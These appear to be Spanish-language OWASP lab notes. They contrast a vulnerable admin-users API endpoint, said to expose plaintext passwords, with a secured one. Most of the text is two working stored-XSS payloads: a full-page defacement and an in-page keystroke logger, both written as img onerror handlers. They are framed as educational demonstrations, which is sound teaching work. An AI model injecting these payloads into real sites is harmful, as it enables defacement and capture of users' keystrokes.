# Cyber-Lab OWASP - Notas de Pruebas de Seguridad

## API Vulnerable vs API Segura

### Endpoint vulnerable

https://seguridad-peach.vercel.app/api/vulnerable/admin/users

**Observaciones:**
- Exposición directa de usuarios
- Posible ausencia de autenticación/autorización
- Contraseñas visibles en texto plano
- Broken Access Control
- Sensitive Data Exposure
- Falta de hashing de passwords

---

### Endpoint seguro

https://seguridad-peach.vercel.app/api/seguro/admin/users

**Objetivo esperado:**
- Requerir autenticación
- Validar roles administrativos
- Sanitizar respuesta
- No exponer passwords
- Aplicar controles de acceso

---

# Ruta segura para cambio de contraseña

https://seguridad-peach.vercel.app/seguro/cambiar-password

**Observaciones esperadas:**
- Validación de sesión
- Verificación de contraseña actual
- Hash seguro
- Protección CSRF
- Sanitización de entradas

---

# Defacement Visual - Stored XSS Demo

```html
<img src=x onerror="
document.body.innerHTML = `
<div style='
  position:fixed;
  inset:0;
  background:#000;
  color:#00ff41;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  font-family:monospace;
  z-index:999999;
  overflow:hidden;
'>
  <div style='
    font-size:90px;
    font-weight:bold;
    text-shadow:0 0 20px #00ff41;
    animation: pulse 1s infinite;
  '>
    ⚠ SYSTEM BREACH ⚠
  </div>

  <div style='
    margin-top:30px;
    font-size:28px;
    max-width:900px;
    text-align:center;
    line-height:1.6;
  '>
    Este sitio demuestra una vulnerabilidad crítica de seguridad.<br>
    El contenido fue modificado mediante <span style=color:red>XSS</span>.
  </div>

  <div style='
    margin-top:40px;
    padding:20px 40px;
    border:2px solid #00ff41;
    font-size:22px;
    background:rgba(0,255,65,0.08);
    box-shadow:0 0 25px #00ff41;
  '>
    OWASP LAB - STORED XSS DEMO
  </div>

  <div style='
    position:absolute;
    bottom:20px;
    font-size:14px;
    opacity:.6;
  '>
    Educational Security Demonstration
  </div>
</div>

<style>
@keyframes pulse {
  0% { transform:scale(1); opacity:1; }
  50% { transform:scale(1.05); opacity:.7; }
  100% { transform:scale(1); opacity:1; }
}
body {
  overflow:hidden;
}
</style>
`;
">


# Demostración Educativa de Eventos de Teclado

```html
<img src=x onerror="
(() => {

  if (window.__demoLoggerInstalled) return;
  window.__demoLoggerInstalled = true;

  const panel = document.createElement('div');

  panel.style = `
    position:fixed;
    bottom:20px;
    right:20px;
    width:400px;
    height:220px;
    background:#000;
    color:#00ff41;
    border:2px solid #00ff41;
    padding:10px;
    overflow:auto;
    z-index:999999;
    font-family:monospace;
    box-shadow:0 0 20px #00ff41;
  `;

  panel.innerHTML = '<h3>Keyboard Event Demo</h3>';

  document.body.appendChild(panel);

  document.addEventListener('keydown', e => {

    const line = document.createElement('div');

    line.textContent =
      '[' + new Date().toLocaleTimeString() + '] ' +
      'KEY: ' + e.key;

    panel.appendChild(line);

    panel.scrollTop = panel.scrollHeight;

    console.log('KEY EVENT:', e.key);

  });

})();
"> 